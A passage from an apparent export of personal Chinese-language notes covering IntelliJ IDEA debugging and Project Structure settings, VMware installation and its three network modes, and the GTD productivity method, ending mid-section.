Studio的好，但是它调试时不能看lambda的值也真是挺恶心的，据说2015版以后开始支持有限的lambda了。IDEA在这方面就做的非常到位。Java 8带来的Stream里面到底是什么，有时候很难知道。通过IDEA提供的这个功能，我们可以很轻松地看到流在各个步骤之间的变化。如下图：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220327143539.png)\n\n展平模式（Flat Mode）更是提供了全局的视角：\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220327143559.png)\n\n使用这个功能也非常简单，当程序在lambda表达式的任意处停下时，单击调试窗口的Trace Current Stream Chain按钮即可。\n官方文档传送门：https://www.jetbrains.com/help/idea/analyze-java-stream-operations.html\n\n#### 调试内存泄漏（Memory View）\n内存泄漏是一个比较头疼的问题，好在IDEA提供了内存分析工具，只要单击调试窗口右上角的Restore ‘Memory’ View就能看到内存窗口，然后点击其中的Click to load the classes list就能看到当前内存的对象分布情况。然后可以据此分析到底是哪个类的对象数量看起来有问题。\n官方文档传送门：https://www.jetbrains.com/help/idea/analyze-objects-in-the-jvm-heap.html\n\n## IDEA中的Project Structure的几个设置：\n### Modules\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220327143614.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220327143630.png)\n\n### Facets\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220327143647.png)\n\nFacets的作用就是配置项目框架类支持。比如我们现在要开发的是一个 web 项目，那就需要 web 相关的 Facet，事实上，如果没有这个配置支持，编译器也不知道这个项目是个 web 项目，也就不会去读取 web.xml 的配置，更无法被 tomcat 这种容器支持。\n\n\n### Artifacts\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220327143815.png)\n\n### Project\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220327143829.png)\n\n### Facets和Artifacts的区别：\nFacets 表示这个module有什么特征，比如 Web，Spring和Hibernate等；\n\nArtifact 是maven中的一个概念，表示某个module要如何打包，例如war exploded、war、jar、ear等等这种打包形式；\n\n一个module有了 Artifacts 就可以部署到应用服务器中了！\n\n### 在给项目配置Artifacts的时候有好多个type的选项，exploed是什么意思\nexplode 在这里你可以理解为展开，不压缩的意思。也就是war、jar等产出物没压缩前的目录结构。建议在开发的时候使用这种模式，便于修改了文件的效果立刻显现出来。\n\n默认情况下，IDEA的 Modules 和 Artifacts 的 output目录 已经设置好了，不需要更改，打成 war包 的时候会自动在 WEB-INF目录 下生产 classes目录，然后把编译后的文件放进去。\n\nartifact你把它理解成“生成的东西”就差不多了。这个词强调的是这是你软件生产过程中某一步的产生物，不像程序本身，或者是配置文件这些，是你手写出来的\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220327143843.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220327143901.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220327143938.png)\n\n注意：通常在开发环境下，部署为war exploded，这种方式支持热部署[update classes and resources]。\n\n上图选项中有web application exploded，这个是以文件夹形式（War Exploded）发布项目，选择这个，发布项目时就会自动生成文件夹在指定的output directory,\n\n如果选 web application archive，就是war包形式，每次都会重新打包全部的,将项目打成一个war包在指定位置\n\n# 插件\n- Alibaba Java Coding\n- Free Mybatis plugin\n- IDE Eval Reset\n- IdeaVim\n- JRebel and XRebel\n- Material Theme UI\n- RestfulTool\n"
  },
  {
    "title": "./notes/软件/vmware.md",
    "body": "# 虚拟机安装\n在虚拟机上装系统就分为2步：买电脑与装系统\n其中买电脑就是硬件方面，安装个虚拟机（vmware），然后对其进行硬件配置\n\n## 买电脑\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191129172910.png\"/>\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191129173415.png\"/>\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191129173456.png\"/>\n\n## 装系统\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191129173620.png\"/>\n\n然后点击启动虚拟机，来进行安装系统，\n如果一启动虚拟机就报如下错误：\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191129173655.png\"/>\n\n报如上错误的原因是，真实机没有开启虚拟化设置\n解决方法：进入bios，然后进行如下设置\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191129173720.png\"/>\n\n问题解决后，然后进行系统安装\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191129174142.png\"/>\n\nPS：在VMware中会遇到2个名称\n1. 虚拟机名：\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191129174554.png\"/>\n\n2. 主机名\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191129174632.png\"/>\n\n注：\n可以通过命令hostname的方式来查看主机名\n一定要注意：主机名中不要含有特殊字符，例如：‘_', 因为主机名就类似于url，而url中有很多保留字\n\n在ubuntu下修该主机名\n1. 临时生效\n\n```\n1. root@jiqing:~# hostname jq\n2. root@jiqing:~# hostname\n3. jq\n```\n重新打开一个窗口生效。\n2. 永久生效\nubuntu下：\n```\n1、root@jiqing:~# vim /etc/hostname\n2、修改/etc/cloud/cloud.cfg\nsudo nano /etc/cloud/cloud.cfg\nThis will cause the set+update hostname module to not operate (if true)\npreserve_hostname: true  #这里是将false改成true\n```\nCentos下：\n```\n vim    /etc/sysconfig/network\n  注：修改后要重启计算机才能生效\n  命令： 重启：reboot        关机：  halt\n```\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191129175108.png\"/>\n\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191129175159.png\"/>\n\n如果启动虚拟机时，出现如下问题：\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191129190920.png\"/>\n\n解决方法：\n打开Windows powershell（管理员）\n关闭：bcdedit /set hypervisorlaunchtype off\n然后重启电脑即可\n\n开启：bcdedit /set hypervisorlaunchtype auto\n\n# VMware设置虚拟机与物理主机处于同一网段\n在使用VMware的过程中，有时候需要让虚拟机与物理主机处于同一个局域网段，这时候就需要用桥接模式。\n方法：\n1、打开VMware上方菜单栏的 编辑→虚拟网络编辑器\n![](https://raw.githubusercontent.com/NaisWang/images/master/20221008151012.png)\n\n然后将虚拟中的网络模式改成桥接模式即可\n\n# vmware虚拟机三种网络模式、桥接、NAT、仅主机\nvmware为我们提供了三种网络工作模式，它们分别是：Bridged（桥接模式）、NAT（网络地址转换模式）、Host-Only（仅主机模式）。\n\n打开vmware虚拟机，我们可以在选项栏的“编辑”下的“虚拟网络编辑器”中看到VMnet0（桥接模式）、VMnet1（仅主机模式）、VMnet8（NAT模式），那么这些都是有什么作用呢？其实，我们现在看到的VMnet0表示的是用于桥接模式下的虚拟交换机；VMnet1表示的是用于仅主机模式下的虚拟交换机；VMnet8表示的是用于NAT模式下的虚拟交换机。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20221008151034.png)\n\n同时，在主机上对应的有VMware Network Adapter VMnet1和VMware Network Adapter VMnet8两块虚拟网卡，它们分别作用于仅主机模式与NAT模式下。在“网络连接”中我们可以看到这两块虚拟网卡，如果将这两块卸载了，可以在vmware的“编辑”下的“虚拟网络编辑器”中点击“还原默认设置”，可重新将虚拟网卡还原。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20221008151049.png)\n\n小伙伴看到这里，肯定有疑问，为什么在真机上没有VMware Network Adapter VMnet0虚拟网卡呢？那么接下来，我们就一起来看一下这是为什么。\n\n## 1. Bridged(桥接模式)\n什么是桥接模式？桥接模式就是将主机网卡与虚拟机虚拟的网卡利用虚拟网桥进行通信。在桥接的作用下，类似于把物理主机虚拟为一个交换机，所有桥接设置的虚拟机连接到这个交换机的一个接口上，物理主机也同样插在这个交换机当中，所以所有桥接下的网卡与网卡都是交换模式的，相互可以访问而不干扰。在桥接模式下，虚拟机ip地址需要与主机在同一个网段，如果需要联网，则网关与DNS需要与主机网卡一致。其网络结构如下图所示：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20221008151104.png)\n\n接下来，我们就来实际操作，如何设置桥接模式。\n\n首先，安装完系统之后，在开启系统之前，点击“编辑虚拟机设置”来设置网卡模式。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20221008151117.png)\n\n点击“网络适配器”，选择“桥接模式”，然后“确定”\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20221008151131.png)\n\n在进入系统之前，我们先确认一下主机的ip地址、网关、DNS等信息。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20221008151143.png)\n\n然后，进入系统编辑网卡配置文件，命令为vi /etc/sysconfig/network-scripts/ifcfg-eth0\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20221008151158.png)\n\n添加内容如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20221008151210.png)\n\n编辑完成，保存退出，然后重启虚拟机网卡，使用ping命令ping外网ip，测试能否联网。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20221008151225.png)\n\n能ping通外网ip，证明桥接模式设置成功。\n\n那主机与虚拟机之间的通信是否正常呢？我们就用远程工具来测试一下。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20221008151238.png)\n\n主机与虚拟机通信正常。\n\n这就是桥接模式的设置步骤，相信大家应该学会了如何去设置桥接模式了。桥接模式配置简单，但如果你的网络环境是ip资源很缺少或对ip管理比较严格的话，那桥接模式就不太适用了。如果真是这种情况的话，我们该如何解决呢？接下来，我们就来认识vmware的另一种网络模式：NAT模式。\n\n## 2. NAT（地址转换模式）\n刚刚我们说到，如果你的网络ip资源紧缺，但是你又希望你的虚拟机能够联网，这时候NAT模式是最好的选择。NAT模式借助虚拟NAT设备和虚拟DHCP服务器，使得虚拟机可以联网。虚拟机的IP只需要配置NAT网段中的IP，访问外部host可以通过宿主主机IP访问，<font color=\"red\">它不需要有外部网络独立的IP</font>，其网络结构如下图所示：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20221008151250.png)\n\n在NAT模式中，主机网卡直接与虚拟NAT设备相连，然后虚拟NAT设备与虚拟DHCP服务器一起连接在虚拟交换机VMnet8上，这样就实现了虚拟机联网。那么我们会觉得很奇怪，为什么需要虚拟网卡VMware Network Adapter VMnet8呢？原来我们的VMware Network Adapter VMnet8虚拟网卡主要是为了实现主机与虚拟机之间的通信。在之后的设置步骤中，我们可以加以验证。\n<font color=\"red\">注： 如果真机使用的是WIFI， 虚拟机使用NAT模式时， 则我们需要打开真机的无线网卡网络共享， 否则， 虚拟机无法通信</font>\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20221008151304.png)\n\n首先，设置虚拟机中NAT模式的选项，打开vmware，点击“编辑”下的“虚拟网络编辑器”，设置NAT参数及DHCP参数。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20221008151316.png)\n\n将虚拟机的网络连接模式修改成NAT模式，点击“编辑虚拟机设置”。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20221008151328.png)\n\n点击“网络适配器”，选择“NAT模式”\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20221008151340.png)\n\n然后开机启动系统，编辑网卡配置文件，命令为vi /etc/sysconfig/network-scripts/ifcfg-eth0\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20221008151357.png)\n\n具体配置如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20221008151410.png)\n\n编辑完成，保存退出，然后重启虚拟机网卡，动态获取ip地址，使用ping命令ping外网ip，测试能否联网。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20221008151422.png)\n\n之前，我们说过VMware Network Adapter VMnet8虚拟网卡的作用，那我们现在就来测试一下。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20221008151434.png)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20221008151450.png)\n\n如此看来，虚拟机能联通外网，确实不是通过VMware Network Adapter VMnet8虚拟网卡，那么为什么要有这块虚拟网卡呢？\n\n之前我们就说VMware Network Adapter VMnet8的作用是主机与虚拟机之间的通信，接下来，我们就用远程连接工具来测试一下。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20221008151502.png)\n\n然后，将VMware Network Adapter VMnet8启用之后，发现远程工具可以连接上虚拟机了。\n\n那么，这就是NAT模式，利用虚拟的NAT设备以及虚拟DHCP服务器来使虚拟机连接外网，而VMware Network Adapter VMnet8虚拟网卡是用来与虚拟机通信的。\n\n## 3. Host-Only（仅主机模式）\nHost-Only模式其实就是NAT模式去除了虚拟NAT设备，然后使用VMware Network Adapter VMnet1虚拟网卡连接VMnet1虚拟交换机来与虚拟机通信的，Host-Only模式将虚拟机与外网隔开，使得虚拟机成为一个独立的系统，只与主机相互通讯。其网络结构如下图所示：\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191204131608.png\"/>\n通过上图，我们可以发现，如果要使得虚拟机能联网，我们可以将主机网卡共享给VMware Network Adapter VMnet1网卡，从而达到虚拟机联网的目的。接下来，我们就来测试一下。\n\n首先设置“虚拟网络编辑器”，可以设置DHCP的起始范围。\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191204131627.png\"/>\n设置虚拟机为Host-Only模式。\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191204131647.png\"/>\n开机启动系统，然G后设置网卡文件。\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191204131704.png\"/>\n保存退出，然后重启网卡，利用远程工具测试能否与主机通信。\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191204131728.png\"/>\n主机与虚拟机之间可以通信，现在设置虚拟机联通外网。\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191204131820.png\"/>\n我们可以看到上图有一个提示，强制将VMware Network Adapter VMnet1的ip设置成192.168.137.1，那么接下来，我们就要将虚拟机的DHCP的子网和起始地址进行修改，点击“虚拟网络编辑器”\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191204131838.png\"/>\n重新配置网卡，将VMware Network Adapter VMnet1虚拟网卡作为虚拟机的路由。\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191204131857.png\"/>\n重启网卡，然后通过 远程工具测试能否联通外网以及与主机通信。\n<img width=\"500px\" src=\"https://gitee.com/naiswang/images/raw/master/20191204131917.png\"/>\n测试结果证明可以使得虚拟机连接外网。\n以上就是关于vmware三种网络模式的工作原理及配置详解。\n\n# This Virtual Machine AppearstobBe in Use错误\nWhen you get the following error on VMware, try to do the following workaround.\n\nError:\n```\nThis virtual machine appears to be in use.\n\nIf this virtual machine is not in use, press the \"Take Ownership\"  button to obtain ownership of it. Otherwise, press the 'Cancel' button to avoid damaging it.\n```\n\nSolution:\n```\nTurn off the VM.\nClose VMware Workstation.\nOpen the folder where VMware files are located indicated in the error message.\nRemove any .lck or .lock files.\nRun VMware Workstation.\nStart the VM.\nKarim BuzdarVirt\n```\n"
  },
  {
    "title": "./notes/软件/GTD.md",
    "body": "# 重新认识 GTD，把事情做好，而不是把事情做完。\n把事情做完真的有那么难吗？真的。因为没有人能把事情做完。在《只顾着完成任务清单，可能会让你离目标越来越远》当中，我们就强调了这一点。这里不再赘述。\n\nGTD （Getting Things Done ）直接翻译为“把事情做完”，本身就很可能让人误解成——你必须做完所有的事情。但其实，“把你需要做的事情列出来，并处理它” 和“把事情做完”是两件完全不同的事情。而 GTD 所强调的，是前者。\n\n所以，确切地说，Getting Things Done 应该翻译为，“把事情处理完” 或者 “把事情做好”。这正如 GTD的基本理念一样：**真正的生产力不应该通过实现的计划目标的数量来衡量，而应该由本质上有价值的结果来衡量。**\n\n所以，整个 GTD 的使用过程，就是对事件进行处理的过程。而它的目的可以从下图当中看到：\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210525133150.png\" width=\"700px\"/>\n\n第一，清空大脑，把大脑从 “要做什么” 和 “怎么做” 的混乱当中拯救出来（moving planned tasks and projects out of the mind by recording them externally）。第二，让自己随时都能明确地知道，下一步应该做什么（breaking them into actionable work items）。\n\n那么，它是如何清空大脑，把自己从混乱中解救出来的呢？在一篇名为《Getting Things Done: The Science behind Stress-Free Productivity 》的论文中已经有了大致的解释。\n\n人在短期内只能记住有限数量的事物，且要从长期记忆当中精准地获取信息是非常困难的。比如，你可以试着在脑子里回忆可乐、饼干的品牌名称，你能想起来几个？在这种情况下，我们可以把大脑看成一个不稳定的存储器（硬盘），它不能如你所愿地帮你稳定存储数据，以至于你没有办法快速对它们进行优先级的排序。那么，使用一张纸，或者某款软件作为稳定的外部存储器，某种程度上可以解决这种问题。说人话就是，好记性不如烂笔头。\n\n从另一方面来讲，过于混乱的待办事项会让你的大脑陷入某种失控感当中，随之而来的，就是焦虑、拖延、感觉压力山大。而利用外部存储器，解决这一问题，可以让大脑重新拥有这种掌控感，伴随而来的幸福感也就随之上升。\n\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/GTD最终版思维导图.png\" width=\"700px\"/>\n\n# GTD 的具体流程\nGTD 几经改版，现在为捕获（Capture）、明晰（Clarify）、组织（Organize）、回顾（Reflect）、执行（Engage）。\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210525133516.png\" width=\"700px\"/>\n\n可以看到，新的版本更强调几件事：一是主动性，主动捕获，而不是简单收集；二是强调结果，需要明晰，而不是简单整理；三是在计划的同时，更强调回顾；四是执行更强调与执行对象的密切联系，而不是简单地做。\n\n这五个步骤的具体做法是什么呢？\n\n## 第一步是捕获。\n一言以蔽之，捕获，就是把所有你遇到的大小事情都捕获在一起，装进你的收集箱（Inbox）当中。如果是白纸，那就需要一个分区或列表；如果是一款软件，那就需要专门的空间或分区。\n\n## 第二步是明晰。\n明晰的方式，就是一件件拎出收集箱当中的东西，每一件都问自己五个问题：\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210525142629.png\" width=\"700px\"/>\n\n**①这件事可行动吗？**\n如果不可行动，你捕获的可能是今后需要查阅的参考资料，又或者是今后可能要做的事情，如果都不是，那这是一件不用做的事情。那么这里，就准备三个分区：参考资料（Reference）、可能清单（Someday/maybe）、回收箱（Trash）；\n如果可以行动，那就进入下一步。\n\n**②这件事可以一步搞定吗？**\n如果不能一步搞定，说明它需要分步骤执行，甚至需要你为它专门制作一个执行方案。对于这种项，需要为它准备一个分区：项目清单（“Plan project\" task）；\n如果它可以一步搞定，那就进入下一步。\n\n**③这件事可以在 2 分钟内搞定吗？**\n如果能，那就立即做。比如预约快递、医生，信用卡还款……如果不能，那就进入下一步。*\n\n**④这件事该我做吗？**\n如果这件事情你并不是非做不可，而且可以分配给其他人来做，这种事就需要一个单独的分区，叫做等待清单（“Wait for\" task）。你不需要做，但你需要跟进。\n\n**⑤这件事有特定的时间吗？**\n如果有特定的时间，比如已经预约了医生洗牙、已经约了朋友周六聚会，那么请直接把它放在你的日历当中，或者日程应用当中。让它在特定的时间提醒你。\n如果没有特定的时间，请为它准备一个分区，名为执行清单（“@Context” task），并专门为它安排时间去执行。\n\n## 第三步是组织。\n实际上，到进行第二步的时候，第三步就已经初见雏形了。除了第一步的收集箱（Inbox），我们在第二步拥有了这些分区:执行清单（“@Context” task）、等待清单（“Waiting for” task）、项目清单（“Plan project” task）、可能清单（Someday/maybe）、参考资料（Reference）、回收箱（Trash）、日历/相关应用。\n\n## 第四步是回顾。\n实际上不难看出，当你第一次建立好的分区并部署好 GTD，从第二次使用开始，当你进行第二步（明晰）的时候，就已经在开始第三步（组织）了。而第四步的回顾，才是及其重要的一步。\n\n回顾你的所有清单，查出错漏，以及检查你的安排是否科学。其中——\n- 从收集箱出去的项目永远不要再放回收集箱；\n- 项目清单中的事项需要你主动将其拆解，步骤，并为其谋划执行方案，把大项目拆解成小步骤，并分解到其他清单当中。记住 GTD 的第二大目的，随时随地都明确地知道，下一步应该做什么；\n- 要特别保障等待清单、可能清单、回收箱三个分区当中的回顾，主动确定等待清单是否被完成、回收箱和可能清单中的事项是否有变动（变成可执行或其他）；\n- 日历或提醒事项应用中的提醒是否恰当，比如下个月末要完成论文是 Deadline，但是否应该这个月就提醒自己，并且分解开来？\n- 为第四步腾出专门的时间，比如每天、每三天或每周、每月。\n\n## 第五步是执行。\n其实从这里也可以看到，执行和回顾，也不是两个完全分开的步骤。在具体执行过程当中，就已经在进行回顾，特别是对于项目清单当中的事项来说。\n需要记住，执行，是Engage，而不是 Do，换成人话就是，你需要去“拿结果”，而不是做了 “等结果”。\n\n# GTD 的具体实践——从七张白纸开始\n如果你用纸张，准备七张白纸、七页笔记本，都行。分别在七张纸上写上：收集箱（Inbox）、执行清单（”@Context” task“）、等待清单（”Waiting for“ task）、项目清单（“Plan project“ plan）、可能清单（Someday/maybe）、参考资料（Reference）、回收箱（Trash）。\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210525134359.png\" width=\"700px\"/>\n\n如果你用文档工具，Word 或其他的都可以。我们试着打开一个空白文档，新建这几个标题。然后，设置字体、字号，并不是说你都得这么去设置，这里只是为了让自己看起来方便。最终呈现出来的，是这个样子。在 Word 当中，你可以点击【视图】菜单，然后勾选【导航窗格】。在左侧显示像这样，也是为了方便你看起来更清晰。\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210525134411.png\" width=\"700px\"/>\n\n现在，我们以自己平常的生活、工作或者作息时间等等为基础，把所有你需要的、需要处理的事情都列举在收集箱当中。\n以我自己为例。\n星期天，我需要和诗词团队的小伙伴开一个碰头会；星期一早上，需要和编辑部小伙伴开个讨论会；车没有审，所以需要审车；猫咪没有粮食了，买猫粮；我准备给大家做一套免费思维导图公开课；电脑充电线坏了，需要更换；有一本 Graphic Organizers 的书没看完；听说康奈尔笔记法 92 年有一本中国翻译版，想去旧书网淘一淘；我需要客户 A 的一份合同样本；我想学习 Swift 编程；上午客户 B 打电话，问要不要去参加北京的会议……\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210525134434.png\" width=\"700px\"/>\n你会发现，干坐在这里想，你不可能列举完所有需要做的事情，如果可以，说明你的大脑能够快速调取信息，根本不需要 GTD。对于大部分普通人来说，我们只能暂时列出此刻能想到的内容。等到新的事情出现或者灵光乍现的时候，赶紧记下来。\nOK，如果你列举在 Word 文档上，它大概就是这样。\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210525134450.png\" width=\"700px\"/>\n\n你看，GTD 要帮你达到的第一个目的，是清空你的大脑，让它不再因为有一大堆的事情塞满脑子，而混乱，焦虑。当你用一张纸或七张纸，一份 Word 文档或者 Excel 表格，一份笔记应用又或者其他任何介质，把脑子里要做的所有事，无论大小，全部列出来之后，这第一个目的，算是达到了。第二个目的，就是让你随时都知道，你的下一步，应该做什么。\n\n# 收集箱当中的事情如何放进其他分区？\n现在，我们要做的，就是把收集箱当中的事情，根据实际情况分别放入其他的分区当中，所用到的依据，就是第二节当中，我们提到的那五个问题。\n\n- 第一件事情，是和诗词团队的小伙伴在星期天开一个碰头会。它可行动吗？当然，开个会有什么不能行动的。它可以一步搞定吗？当然。它能在两分钟搞定吗？当然不能，这类碰头会对我来说，一次估计五到七个小时左右；该我做吗？当然；有特定的时间吗？当然，这个星期天。所以，它应该被直接放在日历或提醒应用当中。如果你用的就是普通的日历，当然是直接在日历当中圈出来。像这样。如果有具体的时间，也一并写上。\n- 第二件事情，是在周一的早上，和编辑部的小伙伴开个讨论会，和刚才一样，放进日历当中；\n- 第三件事情，审车。这件事当然是可行动，也可以一步搞定，它没有一个特定时间，只有一个最后期限（Deadline），那么直接把它放进执行清单；\n- 第四件事情，买猫粮，也是一个可行动、可以一步搞定、没有特定时间的事项，直接放进执行清单；\n- 第五件事情，制作思维导图免费公开课，不用多说，应该放进项目清单，一两步我搞不定；\n- 第六件事情，更换充电线，执行清单；\n- 第七件事情，看完 Graphic Organizers，当然可行动，但它确实不能一步搞定，所以直接放进项目清单；\n- 第八件事情，去旧书网淘一淘有没有这本书，它可行动，也可以一步搞定。注意，是否能够一步搞定对不同的人来说，可能标准不同。比如，对我来说，我会直接去常去的旧书网直接搜索，有这本书，大致价格相同，直接下单即可，这算一步；如果你需要查看不同网络的价格、明晰不同的版本，那它可能就不是一步搞定的事情。这里，我把它放进执行清单；\n- 第九件事情，我需要客户 A 的一份合同样本。它当然可行动，也可以一步搞定。能两分钟内搞定吗？当然不能。并且很明显，它是一件别人去做的事情，我需要等待。因此，就被放进等待清单当中。\n- 第十件事情，我想学习 Swfit 编程。这我很清楚我真的只是想一想，没有确定、没有计划。对于这种事情，很多人可能直接开始去做了，但因为一开始没有去想清楚，最后，两分聪明，三分热度，又放弃了。这就是可能清单的意义所在。所以，这件“我想的事情”，只能暂时放进可能清单。当时机成熟，可能的事情变成可以的时候，你要专门为它做计划，而不是想想就做。\n- 第十一件事情，回复客户 B ，是否要去参加北京的会议。打电话显然是一件两分钟内可以完成的事情。但你能不能去，要不要去这个展会，是你需要权衡的。一般来说，当你接到电话的那一刻，这个事情应该放在哪个分区当中，就已经需要你的判断了。\n\n# 执行清单四大注意事项。\n正式开始之前，我想问你这样一个问题。这份清单当中，我给它们做一个编号。如果这是你的执行清单，你会先做哪件事？\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210525141118.png\" width=\"700px\"/>\n\n一般来讲，没真正接触过 GTD 的人们可能更倾向于从 ③⑥⑦ 当中选择一件事来做，有的可能还会选择 ④。然而，这只是一份用于演示的执行清单，实际情况中，我们可能会面临数不清的、类似于 ③⑥⑦ 这种小事——你的一天可能这么度过：\n\n倒杯咖啡、回复下客户（或导师）的邮件、微信、钉钉，中途遇到朋友聊天，顺带聊两句，反正看起来不影响工作嘛。客户中途提出了新的意见，于是你马上回复……还在头疼的时候，已经中午十二点了。下午终于处理完客户的事儿，才想起来，哇，猫粮没买、书也没买。回看下这份执行清单，可以说，什么重要的事情都没做。\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210525141131.png\" width=\"700px\"/>\n\n第二天，你告诉自己说，“老子今天又要干大事儿了！”，但一天结束一看，和前一天没差。\n\n这就是为什么，我们在上一节强调说，要根据自己的目标，把重要的事情放在第一位，用这种方式来排序。因为用难易程度来排序，通常可能因为琐事太多，让你迟迟做不了重要的事情，也就离你的目标、乃至理想生活状态越来越远。\n\n但是，回到刚才的问题，会不会因为迟迟没有做完前面的事情，猫就给饿死了呢？\n\n不会。你只需要注意这四个事项。\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210525141149.png\" width=\"700px\"/>\n\n## 第一，能被放进执行清单的，都是对你来说可以一步搞定的事情；\n这一点已经足以让你打消很多疑虑。如果一件只需要一步就能搞定的事情，你却用了一天、两天甚至三天，除非事情非常特殊，否则你是否应该怀疑自己的态度或能力有问题？\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210525141222.png\" width=\"700px\"/>\n当然，你可能会说，类似于买猫粮、买新的充电线这种事情，都好像不太费力就能做完，而更接近于我们目标的做计划、做方案，却更让人头疼，以至于我们的大脑真的特想拖延、拖延、再拖延。而且，难道做计划、做方案这种事情真的不应该从长计议，以至于需要花费大量的时间吗？\n\n做计划、做方案这种事情确实相对更花时间，但我想告诉你的是，它们让人头疼并非因为它们难，而是因为我们很少接触，而误以为难。这刚好引出我要说的第二大注意事项。\n\n## 第二，做好时间预估。\n来看看这七件事，你打算分别在这些事情上用多长的时间呢？你也可以试试看，在自己的执行清单上，给要做的事情做一个时间预估，并把时间标记在后面。对于我来说，是这样：\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210525141328.png\" width=\"700px\"/>\n做阅读计划，我预计需要 1 小时；做公开课方案，我预估 2 小时；淘旧书，我预估 10 分钟；确定是否参会，我预估 30 分钟；审车，我预估 7 小时；买猫粮预估 10 分钟；更换电池充电线，我预估 10 分钟。\n\n## 第三，为特别事件预留时间。\n在上一小节当中，我们说，尽可能去做完所有的事情，是有前提的：你要保障自己有充足的睡眠、健康的身体，而且不能牺牲合理的人际关系、个人幸福感。\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210525141531.png\" width=\"700px\"/>\n当你把执行清单按照目标权重进行排序之后，势必看到了买猫粮和更换充电线这两件事情的重要性。也许你的猫粮只能撑三天，而你不得不买了，因为你的幸福感就将毁在这些“主子”手上。怎么办？\n\n我会在清单中注明，今天必须买，那么肯定会留足这个预估时间。比如有一个方案，需要三天才能完成，我可能会在下午五点左右就停下来这个事项，今天告一段落。然后着手，把猫粮给买了。这样既保证我这一天推进了距离自己目标更近的事情，又买了猫粮。\n另外，人是会变通的。类似这种事情，你也可以请其他人帮你搞定啊。比如同是铲屎官的朋友帮你买一份，事情自然就解决啦。\n\n# 高质量、高效率完成执行清单的三个方法。\n既然我们一开始就指出，GTD 不是把事情做完，而是把事情做好。那么在进行科学合理的排序之后，势必会出现的一个问题就是——如何保证执行清单当中的质量和效率呢？三个简单的方法就可以了。\n\n## 第一，一次只处理一件事情；\n只要你能想得到，任何方法都能找到一本类似的书，这个方法也不例外，那就是加里·凯勒和杰伊·帕帕森的《最重要的事，只有一件》，我不推荐这本书，也不妨碍你去看或者看过这本书。但一次只能处理一件事情肯定最早不出现在这本书里，而且它不是人为的方法，而是人脑自身决定。\n<img src=\"https://gitee.com/NaisWang/images/raw/master/img/20210525141821.png\" width=\"700px\"/>\n\n一次做好一件事情，别被打断，你就能离成事儿更进一步了。\n\n## 第二，使用番茄时钟提高效率；\n打开一个番茄计时器应用，或者买一个厨房计时器都行，比如我们之前推荐过的 Forest，当计时器设定的那一瞬间，专注做你手头上的事情，有消息来，不回；有电话来，不接……即便你是在找资料，看到某些热搜、相关新闻，也会因为意识到自己正在一个番茄时钟当中，而尽量克制不去做无关的事。\n\n## 